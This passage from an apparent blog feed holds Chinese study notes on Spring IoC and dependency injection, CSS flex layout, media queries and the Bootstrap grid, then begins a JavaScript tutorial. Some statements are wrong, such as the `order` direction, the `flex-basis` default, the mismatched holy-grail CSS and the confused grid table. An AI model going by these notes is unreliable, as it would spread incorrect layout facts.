class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 使用这个版本是因为这个版本相对稳定 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="1-定义应用组件"><a href="#1-定义应用组件" class="headerlink" title="1. 定义应用组件"></a>1. 定义应用组件</h2><p>定义应用中的各种组件，例如服务、数据访问对象（DAO）、业务逻辑等。</p><h2 id="2-配置组件"><a href="#2-配置组件" class="headerlink" title="2. 配置组件"></a>2. 配置组件</h2><p>将组件的配置信息放入配置文件，通常使用XML或注解。配置文件包含类名、依赖关系等信息。</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- applicationContext.xml --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userService"</span> <span class="attr">class</span>=<span class="string">"com.example.UserService"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao"</span> <span class="attr">class</span>=<span class="string">"com.example.UserDao"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="3-创建IoC容器"><a href="#3-创建IoC容器" class="headerlink" title="3. 创建IoC容器"></a>3. 创建IoC容器</h2><p>在应用启动时，创建IoC容器。在这个例子中，使用Spring IoC容器。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 应用启动类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyApp</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="4-组件的注册"><a href="#4-组件的注册" class="headerlink" title="4. 组件的注册"></a>4. 组件的注册</h2><p>将定义的组件注册到IoC容器中，容器会根据配置信息实例化和管理这些组件。</p><h2 id="5-依赖注入"><a href="#5-依赖注入" class="headerlink" title="5. 依赖注入"></a>5. 依赖注入</h2><p>通过构造函数或属性注入，解决组件之间的依赖关系。</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- applicationContext.xml --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userService"</span> <span class="attr">class</span>=<span class="string">"com.example.UserService"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"userDao"</span> <span class="attr">ref</span>=<span class="string">"userDao"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao"</span> <span class="attr">class</span>=<span class="string">"com.example.UserDao"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// UserService.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> {</span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setter for dependency injection</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserDao</span><span class="params">(UserDao userDao)</span> {</span><br><span class="line">        <span class="built_in">this</span>.userDao = userDao;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="6-获取组件"><a href="#6-获取组件" class="headerlink" title="6. 获取组件"></a>6. 获取组件</h2><p>在应用程序中，通过IoC容器获取需要的组件实例，而不是手动创建。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// MyApp.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyApp</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get UserService instance from IoC container</span></span><br><span class="line">        <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> context.getBean(<span class="string">"userService"</span>, UserService.class);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="7-使用组件"><a href="#7-使用组件" class="headerlink" title="7. 使用组件"></a>7. 使用组件</h2><p>使用获取到的组件实例来执行业务逻辑。</p><h2 id="8-销毁组件"><a href="#8-销毁组件" class="headerlink" title="8. 销毁组件"></a>8. 销毁组件</h2><p>IoC容器负责管理组件的生命周期，包括销毁和释放资源。</p><h3 id="示例表格"><a href="#示例表格" class="headerlink" title="示例表格"></a>示例表格</h3><table><thead><tr><th>步骤</th><th>描述</th><th>代码示例</th></tr></thead><tbody><tr><td>1</td><td>定义应用组件</td><td>UserService, UserDao</td></tr><tr><td>2</td><td>配置组件</td><td>applicationContext.xml</td></tr><tr><td>3</td><td>创建IoC容器</td><td><code>ApplicationContext context = new ClassPathXmlApplicationContext("applicationContext.xml");</code></td></tr><tr><td>4</td><td>组件的注册</td><td><code>&lt;bean id="userService" class="com.example.UserService" /&gt;</code></td></tr><tr><td>5</td><td>依赖注入</td><td><code>&lt;property name="userDao" ref="userDao" /&gt;</code></td></tr><tr><td>6</td><td>获取组件</td><td><code>UserService userService = context.getBean("userService", UserService.class);</code></td></tr><tr><td>7</td><td>使用组件</td><td><code>userService.doSomething();</code></td></tr><tr><td>8</td><td>销毁组件</td><td>IoC容器管理生命周期</td></tr></tbody></table><p>这个表格展示了IoC的步骤，以及每个步骤的描述和相关示例代码。</p><h1 id="DI-依赖注入-详细步骤"><a href="#DI-依赖注入-详细步骤" class="headerlink" title="DI(依赖注入)详细步骤"></a>DI(依赖注入)详细步骤</h1><p>在传统的Java编程中，对象之间通常是通过创建和管理对象的实例来解决依赖关系，这种方式存在代码复杂度高、对象之间的依赖关系紧密耦合，难以维护和测试等问题。而DI是一种通过外部注入对象的依赖关系来解决对象之间依赖关系的方法，它<strong>降低了代码复杂度</strong>、降低了对象之间的<strong>耦合性</strong>，方便了对象的单元测试和集成测试。</p><p>此外，DI和IOC（Inversion of Control）是两个密不可分的概念，它们是同一个概念的不同角度描述。其中，IOC是一种设计模式，通过将对象的创建和管理交由容器负责，实现了对象之间的解耦和复用；而DI是IOC的一种具体实现方式，通过将依赖关系外置，实现了对象之间的解耦和复用。因此，可以说DI是IOC的一种实现方式。</p><p>在我看来，DI在IOC的基础上实现了更多功能，减缓代码中的数据，降低耦合度，无需new对象。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flex容器和BootStrap框架</title>
      <link href="/NANABLOG/2021/12/18/flex%E5%AE%B9%E5%99%A8%E5%92%8CBootstrap%E6%A1%86%E6%9E%B6/"/>
      <url>/NANABLOG/2021/12/18/flex%E5%AE%B9%E5%99%A8%E5%92%8CBootstrap%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="响应式Flex弹性布局"><a href="#响应式Flex弹性布局" class="headerlink" title="响应式Flex弹性布局"></a>响应式Flex弹性布局</h2><p>Flex弹性布局是一种CSS布局模式，它使用flex容器（flex container）和flex项目（flex items）来管理元素的排列和对齐。下面是一些关于flex弹性布局的容器属性和项目属性的笔记，使用表格和注释标题以便于理解。</p><h4 id="容器属性："><a href="#容器属性：" class="headerlink" title="容器属性："></a><strong>容器属性：</strong></h4><table><thead><tr><th align="center">属性名</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>display</code></td><td align="center">指定元素是否为flex容器，值为<code>flex</code>或<code>inline-flex</code>。</td></tr><tr><td align="center"><code>flex-direction</code></td><td align="center">定义flex项目的排列方向，可选值为<code>row</code>（默认值，水平方向）、<code>row-reverse</code>（水平方向，反向排列）、<code>column</code>（垂直方向）和<code>column-reverse</code>（垂直方向，反向排列）。</td></tr><tr><td align="center"><code>flex-wrap</code></td><td align="center">控制flex项目是否换行，可选值为<code>nowrap</code>（默认值，不换行）、<code>wrap</code>（换行）和<code>wrap-reverse</code>（反向换行）。</td></tr><tr><td align="center"><code>justify-content</code></td><td align="center">对齐flex容器中的项目，可选值为<code>flex-start</code>（默认值，起点对齐）、<code>flex-end</code>（终点对齐）、<code>center</code>（居中对齐）、<code>space-between</code>（两端对齐，项目之间的间距相等）、<code>space-around</code>（项目两侧的间距相等）和<code>space-evenly</code>（项目之间的间距和两端的间距相等）。</td></tr><tr><td align="center"><code>align-items</code></td><td align="center">对齐flex容器中的垂直方向上的项目，可选值为<code>stretch</code>（默认值，项目沿主轴方向拉伸以填满容器）、<code>flex-start</code>（起点对齐）、<code>flex-end</code>（终点对齐）、<code>center</code>（居中对齐）和<code>baseline</code>（基线对齐）。</td></tr><tr><td align="center"><code>align-content</code></td><td align="center">当项目换行时，对齐各行项目的垂直方向，可选值为与<code>align-items</code>相同。</td></tr></tbody></table><h4 id="项目属性："><a href="#项目属性：" class="headerlink" title="项目属性："></a><strong>项目属性：</strong></h4><table><thead><tr><th align="center">属性名</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>flex-grow</code></td><td align="center">指定项目的放大比例，默认为0，值越大占据的空间越多。</td></tr><tr><td align="center"><code>flex-shrink</code></td><td align="center">指定项目的缩小比例，默认为1，表示可以缩小到0，值越小缩小越多。</td></tr><tr><td align="center"><code>flex-basis</code></td><td align="center">指定项目在主轴方向上的初始尺寸，默认为0，值越大占据的空间越多。它可以设置为具体的长度或百分比。</td></tr><tr><td align="center"><code>flex</code></td><td align="center">简写属性，将上述三个属性合并为一个值，格式为：<code>flex: flex-grow flex-shrink flex-basis;</code>。</td></tr><tr><td align="center"><code>order</code></td><td align="center">指定项目的排列顺序，默认为0，值越大排列越靠前。可以为负数。</td></tr></tbody></table><p>这些属性可以让你轻松地创建灵活的布局，并实现元素的自动分布和对齐。请注意，还有一些其他属性和值可以用于更高级的布局控制和样式设置，这些属性和值可以在官方文档或其他资源中找到。</p><h4 id="圣杯布局"><a href="#圣杯布局" class="headerlink" title="圣杯布局"></a>圣杯布局</h4><p>圣杯布局是一种常见的网页布局方式，它能够适应多种屏幕大小和设备，并且可以灵活地调整布局以适应不同的设计需求。</p><p>圣杯布局通常包括一个父元素（也称为“圣杯”），以及三个子元素（通常称为“左栏”、“中间栏”和“右栏”）。这些元素可以通过CSS来设置位置和大小，以达到所需的布局效果。</p><p>使用Flexbox实现圣杯布局的主要步骤如下：</p><ol><li>首先需要准备好HTML结构。在HTML文件中，创建一个包含三个子元素的父元素：头部（header）、中间部分（content）和底部（footer）。在中间部分，创建三个子元素：左栏（left）、中间栏（middle）和右栏（right）。</li></ol><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"middle"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><ol><li>使用CSS来设置圣杯布局的样式。在CSS文件中，首先设置父元素的属性。这里，我们将父元素设置为flex容器（flex container），并使用<code>display: flex;</code>属性。然后设置父元素的排列方向（<code>flex-direction</code>），这里我们选择默认的“row”。</li></ol><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> {  </span><br><span class="line">  <span class="attribute">display</span>: flex;  </span><br><span class="line">  <span class="attribute">flex-direction</span>: row;  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol><li>接下来，设置中间部分的子元素的属性。将中间部分的宽度设置为100%，并使用<code>flex: 1;</code>属性来让中间部分自动填充剩余空间。这里，我们将中间部分的背景颜色设置为红色（red）以便于观察效果。</li></ol><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="selector-class">.content</span> {  </span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>;  </span><br><span class="line">  <span class="attribute">background-color</span>: red;  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol><li>最后，设置左、中、右三个子元素的属性。将它们的宽度设置为固定的像素值（比如200px），并使用<code>flex-shrink: 0;</code>属性来防止它们被缩小。同时，设置左、右两个子元素的背景颜色为蓝色（blue）和绿色（green），以便于观察效果。</li></ol><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line"><span class="selector-class">.left</span>, <span class="selector-class">.right</span> {  </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;  </span><br><span class="line">  <span class="attribute">flex-shrink</span>: <span class="number">0</span>;  </span><br><span class="line">  <span class="attribute">background-color</span>: blue;  </span><br><span class="line">}  </span><br><span class="line">  </span><br><span class="line"><span class="selector-class">.middle</span> {  </span><br><span class="line">  <span class="attribute">flex-grow</span>: <span class="number">1</span>;  </span><br><span class="line">  <span class="attribute">background-color</span>: green;  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这样，我们就得到了一个简单的圣杯布局。当屏幕宽度变化时，中间部分会自适应填充剩余空间，而左、中、右三个子元素的高度会自适应变化以保持整体布局的稳定。</p><h4 id="Flex布局子项属"><a href="#Flex布局子项属" class="headerlink" title="Flex布局子项属"></a>Flex布局子项属</h4><p>下面是一个关于Flex布局子项属性的介绍表格，包括常见的属性及其功能，方便初学者快速理解：</p><table><thead><tr><th align="center">属性名</th><th align="center">功能描述</th></tr></thead><tbody><tr><td align="center"><code>flex-grow</code></td><td align="center">指定子项的放大比例，用于分配主轴空间</td></tr><tr><td align="center"><code>flex-shrink</code></td><td align="center">指定子项的缩小比例，用于应对主轴空间不足的情况</td></tr><tr><td align="center"><code>flex-basis</code></td><td align="center">指定子项在主轴方向上的初始尺寸，可理解为“基准尺寸”</td></tr><tr><td align="center"><code>flex</code></td><td align="center">简写属性，合并了上述三个属性</td></tr><tr><td align="center"><code>order</code></td><td align="center">指定子项在主轴上的排列顺序，数值越小排列越靠前</td></tr><tr><td align="center"><code>align-self</code></td><td align="center">用于设置子项在侧轴上的对齐方式，可覆盖主轴对齐方式</td></tr><tr><td align="center"><code>justify-self</code></td><td align="center">用于设置子项在主轴上的对齐方式，可覆盖主轴对齐方式</td></tr><tr><td align="center"><code>align-content</code></td><td align="center">当子项换行时，对齐各行子项在侧轴上的排列方式</td></tr><tr><td align="center"><code>align-items</code></td><td align="center">设置子项在侧轴上的排列方式（单行），可覆盖主轴对齐方式</td></tr><tr><td align="center"><code>flex-wrap</code></td><td align="center">控制子项是否换行，有“nowrap”（默认）、“wrap”和“wrap-reverse”三个选项</td></tr><tr><td align="center"><code>flex-direction</code></td><td align="center">设置主轴的方向，决定了子项的排列顺序，有“row”（默认）、“row-reverse”、“column”和“column-reverse”四个选项</td></tr><tr><td align="center"><code>flex-flow</code></td><td align="center">复合属性，相当于同时设置了<code>flex-direction</code>和<code>flex-wrap</code>两个属性</td></tr></tbody></table><p>以上是Flex布局中常用的子项属性，可以帮助您快速理解和使用Flex布局。但请注意，除了这些属性之外，还有很多其他的CSS属性和值可以用于控制元素的样式和布局。</p><h2 id="响应式布局"><a href="#响应式布局" class="headerlink" title="响应式布局"></a>响应式布局</h2><p><strong>概念</strong>: 响应式布局是一种设计网页的方法，使网页能够自动适应不同设备和屏幕尺寸，以提供更好的用户体验。</p><p><strong>属性</strong>:</p><ul><li><strong>流式布局</strong>：使用百分比或相对单位（如em）来设置宽度，使元素根据屏幕大小自动伸缩。</li><li><strong>媒体查询</strong>：通过CSS媒体查询，根据屏幕特性应用不同的样式。</li></ul><h2 id="媒体查询"><a href="#媒体查询" class="headerlink" title="媒体查询"></a>媒体查询</h2><p><strong>概念</strong>: 媒体查询是CSS中的一种技术，允许根据设备的特性（如屏幕宽度、分辨率、方向等）应用不同的样式。</p><p><strong>使用方法</strong>:</p><figure class="highlight css"><table><tbody><tr><td class="code"><pre><span class="line">css复制代码<span class="comment">/* 基本媒体查询语法 */</span></span><br><span class="line"><span class="keyword">@media</span> (条件) {</span><br><span class="line">  <span class="comment">/* 样式规则 */</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 例子：根据屏幕宽度应用不同的样式 */</span></span><br><span class="line"><span class="keyword">@media</span> (<span class="attribute">max-width</span>: <span class="number">768px</span>) {</span><br><span class="line">  <span class="selector-tag">body</span> {</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">16px</span>; <span class="comment">/* 在小屏幕下增大字体 */</span></span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 例子：根据屏幕方向应用不同的样式 */</span></span><br><span class="line"><span class="keyword">@media</span> (<span class="attribute">orientation</span>: landscape) {</span><br><span class="line">  <span class="selector-class">.header</span> {</span><br><span class="line">    <span class="attribute">display</span>: none; <span class="comment">/* 在横向屏幕方向下隐藏标题 */</span></span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 例子：组合多个条件 */</span></span><br><span class="line"><span class="keyword">@media</span> (<span class="attribute">min-width</span>: <span class="number">600px</span>) <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">1024px</span>) {</span><br><span class="line">  <span class="selector-class">.sidebar</span> {</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">30%</span>; <span class="comment">/* 在特定屏幕宽度范围内设置侧边栏宽度 */</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="Bootstrap框架"><a href="#Bootstrap框架" class="headerlink" title="Bootstrap框架"></a>Bootstrap框架</h2><p>Bootstrap是一个流行的前端框架，可以帮助你快速搭建响应式网页。以下是一些Bootstrap中常用的概念：</p><h4 id="行和列"><a href="#行和列" class="headerlink" title="行和列"></a>行和列</h4><p>在Bootstrap中，网页内容通常被划分成”行”和”列”的网格系统。每一行可以包含若干列，这有助于将内容灵活地布局在页面上。</p><h4 id="行-row"><a href="#行-row" class="headerlink" title="行 (row)"></a>行 (<code>row</code>)</h4><p><code>row</code>是Bootstrap中的一个CSS类，用于创建一行网格。它可以包含一组列，以便将内容在水平方向上对齐。</p><h4 id="列-col"><a href="#列-col" class="headerlink" title="列 (col-*-*)"></a>列 (<code>col-*-*</code>)</h4><p><code>col</code>类用于定义列，<code>*</code>部分可以是屏幕尺寸，例如<code>sm</code>代表小屏幕，<code>lg</code>代表大屏幕。第二个<code>*</code>部分通常是一个数字，表示占据多少份的宽度，总宽度默认为12份。例如，<code>col-sm-4</code>表示在小屏幕上该列占据4份宽度，总宽度为12份。</p><h4 id="列偏移-col-offset"><a href="#列偏移-col-offset" class="headerlink" title="列偏移 (col-*-offset-*)"></a>列偏移 (<code>col-*-offset-*</code>)</h4><p><code>col-offset</code>类可以用于创建列的偏移。例如，<code>col-sm-offset-2</code>表示在小屏幕上将该列向右偏移2份宽度。</p><h4 id="列排序-col-push-和-col-pull"><a href="#列排序-col-push-和-col-pull" class="headerlink" title="列排序 (col-*-push-* 和 col-*-pull-*)"></a>列排序 (<code>col-*-push-*</code> 和 <code>col-*-pull-*</code>)</h4><p>你还可以使用<code>col-push</code>和<code>col-pull</code>类来调整列的排序。例如，<code>col-sm-push-4</code>可以将该列推到右侧，占据4份宽度，而<code>col-lg-pull-8</code>可以将该列推回来，占据8份宽度。</p><p>以上是Bootstrap中用于构建响应式布局的一些基本概念，可以帮助你更好地设计网页并确保在不同设备上都有良好的表现。如果需要更多详细信息或示例，可以提出具体问题</p><h4 id="响应式栅格"><a href="#响应式栅格" class="headerlink" title="响应式栅格"></a>响应式栅格</h4><table><thead><tr><th>类前缀</th><th>栅格系统行为</th><th>最大宽度</th><th>列数</th><th>最大列宽</th><th>解释</th></tr></thead><tbody><tr><td>col-xs</td><td>在所有屏幕大小下都生效</td><td>无限制</td><td>自适应</td><td>无限制</td><td><code>col-xs</code> 类前缀用于定义基本的栅格样式，适用于所有屏幕大小，列数自适应。</td></tr><tr><td>col-sm</td><td>中小屏幕及以上生效</td><td>576px</td><td>自适应</td><td>无限制</td><td><code>col-sm</code> 类前缀适用于中等屏幕及以上，列数自适应，最大宽度为576px。</td></tr><tr><td>col-md</td><td>中等屏幕及以上生效</td><td>768px</td><td>自适应</td><td>无限制</td><td><code>col-md</code> 类前缀适用于中等屏幕及以上，列数自适应，最大宽度为768px。</td></tr><tr><td>col-lg</td><td>大屏幕及以上生效</td><td>992px</td><td>自适应</td><td>无限制</td><td><code>col-lg</code> 类前缀适用于大屏幕及以上，列数自适应，最大宽度为992px。</td></tr><tr><td>col-xl</td><td>超大屏幕生效</td><td>1200px</td><td>自适应</td><td>无限制</td><td><code>col-xl</code> 类前缀适用于超大屏幕，列数自适应，最大宽度为1200px。</td></tr><tr><td>col-xxl</td><td>超大屏幕生效</td><td>1400px</td><td>自适应</td><td>无限制</td><td><code>col-xxl</code> 类前缀适用于超大屏幕，列数自适应，最大宽度为1400px。</td></tr><tr><td>col-1</td><td>所有屏幕大小下生效</td><td>无限制</td><td>1</td><td>无限制</td><td><code>col-1</code> 类前缀用于创建具有1列的栅格，适用于所有屏幕大小。</td></tr><tr><td>col-2</td><td>所有屏幕大小下生效</td><td>无限制</td><td>2</td><td>无限制</td><td><code>col-2</code> 类前缀用于创建具有2列的栅格，适用于所有屏幕大小。</td></tr><tr><td>col-3</td><td>所有屏幕大小下生效</td><td>无限制</td><td>3</td><td>无限制</td><td><code>col-3</code> 类前缀用于创建具有3列的栅格，适用于所有屏幕大小。</td></tr><tr><td>col-4</td><td>所有屏幕大小下生效</td><td>无限制</td><td>4</td><td>无限制</td><td><code>col-4</code> 类前缀用于创建具有4列的栅格，适用于所有屏幕大小。</td></tr><tr><td>col-6</td><td>所有屏幕大小下生效</td><td>无限制</td><td>6</td><td>无限制</td><td><code>col-6</code> 类前缀用于创建具有6列的栅格，适用于所有屏幕大小。</td></tr><tr><td>col-12</td><td>所有屏幕大小下生效</td><td>无限制</td><td>12</td><td>无限制</td><td><code>col-12</code> 类前缀用于创建具有12列的栅格，适用于所有屏幕大小。</td></tr></tbody></table><p>这个表格总结了响应式栅格系统中的常见类前缀和它们的属性。类前缀定义了在不同屏幕大小下如何布局栅格元素。例如，<code>col-md-6</code> 表示在中等屏幕及以上大小下，该栅格元素占据6列，而在小屏幕下，列数会自动调整。这有助于开发人员创建适应不同设备的网页布局。</p><h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><p>这些框架的使用方式是直接在你需要修改的元素和盒子上使用class命名 可以通过空格隔开以便多次命名来达到自己想要的效果</p><h4 id="快速搭建"><a href="#快速搭建" class="headerlink" title="快速搭建"></a>快速搭建</h4><p>通过在网页</p><p>中粘贴你想要的模块组件和CSS样式，可以快速搭建一个网页。</p><p>在此基础上你需要一个容器 和栅格框架，然后在框架里CV你的组件，不断堆叠出一个网页。</p><p>具体可以参考s3/前端开发之Bootstrap+Vue框架里的部分作业和案例。</p><h4 id="快速搭建Bootstrap框架的Html"><a href="#快速搭建Bootstrap框架的Html" class="headerlink" title="快速搭建Bootstrap框架的Html"></a>快速搭建Bootstrap框架的Html</h4><p>请参考案例，主要需要导入三个url</p><p>两个Js 和一个 css 完成框架的搭建后，进入网页根据要求进行搭建</p><h4 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h4><p>首先搭建基础格式，用栅格系统，创建不论如何改变尺寸已然能正常使用的网页框架，基本采用圣杯布局，即两边有空隙，中间内容</p><p>然后复制相关组件完成导航栏，左栏，右栏，内容的基础框架。</p><p>在此基础上可以继续使用栅格系统布局，然后复制组件，不断精进网页。</p><p>其中的重点我认为是栅格系统，熟练掌握栅格系统，可以让组件出现在你想要出现的位置，用到不同尺寸对一个框内的分布会产生不同的适应，比如col-md-3代表这个框在整体（12）格的基础上只会占3格。这一行则在row里生效。</p><p>比如下方实例、</p><p>row </p><p>col-md-3</p><p>col-md-6</p><p>col-md-3</p><p>当实现这样的格式的时候，在一行（row）中，左边的会占用3格中间占用6格右边占用3格最终沾满12格。</p><p>超出格的时候会自动取消，没有用满格的情况下也能正常运行会多余空出。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> 前端 </tag>
            
            <tag> flex </tag>
            
            <tag> BootStrap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript学习笔记</title>
      <link href="/NANABLOG/2021/12/11/JS%20/"/>
      <url>/NANABLOG/2021/12/11/JS%20/</url>
      
        <content type="html"><![CDATA[<blockquote><blockquote><p><strong>JavaScript</strong>（简称JS）是一种高级的、解释型的编程语言，用于在网页上实现交互和动态功能。它是一种多范式的语言，支持面向对象编程、函数式编程和基于原型的编程。</p></blockquote><p>JavaScript最初是为了在网页上添加一些简单的交互效果而创建的，但随着时间的推移，它已经发展成为一种功能强大的语言，可以用于开发复杂的Web应用、移动应用、桌面应用和服务器端应用。</p><p>以下是一些JavaScript的特点和用途：</p><ol><li>客户端脚本语言：JavaScript主要用于在网页上实现客户端的交互和动态效果。它可以通过DOM（文档对象模型）和BOM（浏览器对象模型）来操作网页的元素和属性，实现动态更新和响应用户的操作。</li><li>跨平台：JavaScript可以在各种操作系统和设备上运行，包括桌面、移动和嵌入式设备。它是一种与平台无关的语言，可以在不同的浏览器和环境中执行。</li><li>弱类型语言：JavaScript是一种弱类型语言，不需要在声明变量时指定其类型。变量的类型可以根据赋值的值自动推断，也可以在运行时动态改变。</li><li>面向对象编程：JavaScript支持面向对象编程的特性，包括封装、继承和多态。它使用原型链来实现对象之间的继承关系。</li><li>函数式编程：JavaScript也支持函数式编程的特性，包括高阶函数、匿名函数和闭包。函数可以作为参数传递给其他函数，也可以作为返回值返回。</li><li>第三方库和框架：JavaScript拥有丰富的第三方库和框架，如jQuery、React、Vue.js等，可以帮助开发者更快速、高效地构建复杂的Web应用。</li></ol><p>JavaScript是一门非常灵活和强大的语言，它在Web开发中扮演着重要的角色。通过学习和掌握JavaScript，开发者可以创建出丰富、交互性强的网页和应用程序。</p></blockquote><p><strong>目录:</strong></p><p>[TOC]</p><h5 id="1-引入js三种方法"><a href="#1-引入js三种方法" class="headerlink" title="1.引入js三种方法"></a>1.引入js三种方法</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//行内引入</span></span><br><span class="line">&lt;h1 onclick=<span class="string">"javascript:alert('hello')"</span>&gt;day01&lt;/h1&gt;</span><br><span class="line"><span class="comment">//外部引入</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"hello.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="comment">//内部引入</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"hello javascript"</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h5 id="2-字符串"><a href="#2-字符串" class="headerlink" title="2.字符串"></a>2.字符串</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//字符串类型</span></span><br><span class="line"> <span class="keyword">var</span> str = <span class="string">"123abc456DEF"</span></span><br><span class="line"> <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">"返回指定位置字符串:"</span> + str.<span class="title function_">charAt</span>(<span 